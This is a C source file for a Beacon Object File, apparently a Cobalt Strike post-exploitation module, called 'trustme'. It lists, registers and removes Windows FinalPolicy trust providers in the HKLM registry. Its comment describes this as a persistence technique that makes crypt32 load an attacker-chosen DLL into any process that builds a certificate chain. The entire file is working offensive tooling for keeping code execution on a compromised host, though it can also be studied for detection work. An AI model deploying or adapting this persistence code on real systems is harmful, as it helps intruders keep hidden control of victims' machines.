/*
 * trustme <list|add|remove> [args]
 *
 * Windows trust-provider persistence.  crypt32 loads the DLL named by the
 * $DLL value of every registered FinalPolicy provider inside any process
 * that builds a certificate chain, which makes this a high-value but very
 * noisy persistence primitive (unsigned code, HKLM write, new provider).
 *
 *   list                       - show registered FinalPolicy providers
 *   add <dll> <function> [guid]- register a provider (admin required)
 *   remove <guid>              - unregister a provider (admin required)
 *
 * This BOF only manipulates the registry.  It does not create a DLL and the
 * pointed-to DLL must already exist and export <function>.  Reboot or wait
 * for crypt32 to reload providers before use, and clean up afterwards.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define TRUST_KEY "SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy"
#define KEY_WOW64_64 0x0100

static void guid_braces(const char *in, char *out, int outsz)
{
    int n = bof_strlen(in);
    if (n > 2 && in[0] == '{' && in[n - 1] == '}') {
        bof_strncpy(out, in, outsz);
        return;
    }
    if (outsz < n + 3) { bof_strncpy(out, in, outsz); return; }
    out[0] = '{';
    bof_strncpy(out + 1, in, outsz - 2);
    bof_strncat(out, "}", outsz - bof_strlen(out) - 1);
}

static void guid_new(char *out, int outsz)
{
    GUID g;
    char *p = out;
    int i;

    if (outsz < 40) { bof_strcpy(out, "{}"); return; }
    bof_memzero(&g, sizeof(g));
    if (OLE32$CoCreateGuid(&g) != 0) {
        /* Deterministic fallback: time + pid, still unique enough. */
        unsigned long long t = KERNEL32$GetTickCount64();
        g.Data1 = (unsigned long)t;
        g.Data2 = (unsigned short)KERNEL32$GetCurrentProcessId();
        g.Data3 = (unsigned short)(t >> 16);
        g.Data4[0] = (unsigned char)(t >> 24);
    }

    *p++ = '{';
    bof_hex(g.Data1, 8, p); p += 8; *p++ = '-';
    bof_hex(g.Data2, 4, p); p += 4; *p++ = '-';
    bof_hex(g.Data3, 4, p); p += 4; *p++ = '-';
    for (i = 0; i < 2; i++) { bof_hex(g.Data4[i], 2, p); p += 2; }
    *p++ = '-';
    for (i = 2; i < 8; i++) { bof_hex(g.Data4[i], 2, p); p += 2; }
    *p++ = '}';
    *p = 0;
}

static int get_sz(HKEY h, const char *name, char *out, int outsz)
{
    DWORD size = outsz, type = 0;
    LONG rc;

    out[0] = 0;
    rc = ADVAPI32$RegQueryValueExA(h, name, NULL, &type, (LPBYTE)out, &size);
    if (rc != ERROR_SUCCESS) return -1;
    if (type != REG_SZ && type != REG_EXPAND_SZ) { out[0] = 0; return -1; }
    if (size) out[size - 1] = 0;
    return 0;
}

static void do_list(void)
{
    HKEY root;
    DWORD index;
    int count = 0;

    if (ADVAPI32$RegOpenKeyExA(HKEY_LOCAL_MACHINE, TRUST_KEY, 0,
                               KEY_READ | KEY_WOW64_64,
                               &root) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "cannot open HKLM\\%s\n", TRUST_KEY);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "FinalPolicy providers\n");
    for (index = 0; ; index++) {
        char guid[128], dll[1024], fn[256];
        DWORD glen = sizeof(guid);
        HKEY sub;

        if (ADVAPI32$RegEnumKeyExA(root, index, guid, &glen, NULL, NULL,
                                   NULL, NULL) != ERROR_SUCCESS)
            break;
        if (ADVAPI32$RegOpenKeyExA(root, guid, 0, KEY_READ, &sub)
                != ERROR_SUCCESS)
            continue;
        get_sz(sub, "$DLL", dll, sizeof(dll));
        get_sz(sub, "$Function", fn, sizeof(fn));
        BeaconPrintf(CALLBACK_OUTPUT, "  %-40s %s!%s\n", guid,
                     dll[0] ? dll : "(no $DLL)", fn[0] ? fn : "(no $Function)");
        ADVAPI32$RegCloseKey(sub);
        count++;
    }
    ADVAPI32$RegCloseKey(root);
    BeaconPrintf(CALLBACK_OUTPUT, "\n%d provider(s)\n", count);
}

static int set_sz(HKEY h, const char *name, const char *data)
{
    LONG rc = ADVAPI32$RegSetValueExA(h, name, 0, REG_SZ,
                                      (const BYTE *)data,
                                      (DWORD)(bof_strlen(data) + 1));
    return rc == ERROR_SUCCESS ? 0 : -1;
}

static void do_add(const char *dll, const char *fn, const char *guidarg)
{
    char key[512], guid[128];
    HKEY h;
    DWORD disp = 0;
    LONG rc;

    if (!dll || !dll[0] || !fn || !fn[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: trustme add <dll> <function> [guid]\n");
        return;
    }
    if (KERNEL32$GetFileAttributesA(dll) == INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR, "%s does not exist\n", dll);
        return;
    }

    if (guidarg && guidarg[0]) guid_braces(guidarg, guid, sizeof(guid));
    else guid_new(guid, sizeof(guid));

    bof_strcpy(key, TRUST_KEY);
    bof_strcat(key, "\\");
    bof_strcat(key, guid);

    rc = ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, key, 0, NULL, 0,
                                  KEY_WRITE | KEY_WOW64_64, NULL, &h, &disp);
    if (rc != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
                     "RegCreateKeyEx failed: %ld (run elevated)\n", (long)rc);
        return;
    }

    if (set_sz(h, "$DLL", dll) != 0 || set_sz(h, "$Function", fn) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "failed to write provider values\n");
        ADVAPI32$RegCloseKey(h);
        return;
    }
    ADVAPI32$RegCloseKey(h);

    BeaconPrintf(CALLBACK_OUTPUT, "Registered trust provider %s\n", guid);
    BeaconPrintf(CALLBACK_OUTPUT, "  $DLL      = %s\n  $Function = %s\n", dll, fn);
    BeaconPrintf(CALLBACK_OUTPUT,
                 "Remove with: trustme remove %s\n", guid);
}

static void do_remove(const char *guidarg)
{
    char guid[128], key[512];
    LONG rc;

    if (!guidarg || !guidarg[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: trustme remove <guid>\n");
        return;
    }

    guid_braces(guidarg, guid, sizeof(guid));
    bof_strcpy(key, TRUST_KEY);
    bof_strcat(key, "\\");
    bof_strcat(key, guid);

    rc = ADVAPI32$RegDeleteTreeA(HKEY_LOCAL_MACHINE, key);
    if (rc == ERROR_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "Removed provider %s\n", guid);
    else
        BeaconPrintf(CALLBACK_ERROR, "RegDeleteTree failed: %ld\n", (long)rc);
}

void go(char *args, int alen)
{
    datap parser;
    char *op = "", *a = "", *b = "", *c = "";
    char opbuf[32], abuf[1024], bbuf[256], cbuf[128];
    int len;

    if (args && alen > 0) {
        BeaconDataParse(&parser, args, alen);
        op = BeaconDataExtract(&parser, &len);
        if (op) bof_strncpy(opbuf, op, sizeof(opbuf)); else opbuf[0] = 0;
        a = BeaconDataExtract(&parser, &len);
        if (a) bof_strncpy(abuf, a, sizeof(abuf)); else abuf[0] = 0;
        b = BeaconDataExtract(&parser, &len);
        if (b) bof_strncpy(bbuf, b, sizeof(bbuf)); else bbuf[0] = 0;
        c = BeaconDataExtract(&parser, &len);
        if (c) bof_strncpy(cbuf, c, sizeof(cbuf)); else cbuf[0] = 0;
        op = opbuf; a = abuf; b = bbuf; c = cbuf;
    }

    if (!op[0] || bof_stricmp(op, "list") == 0)
        do_list();
    else if (bof_stricmp(op, "add") == 0)
        do_add(a, b, c);
    else if (bof_stricmp(op, "remove") == 0 || bof_stricmp(op, "del") == 0)
        do_remove(a);
    else
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: trustme <list|add|remove> [args]\n");
}
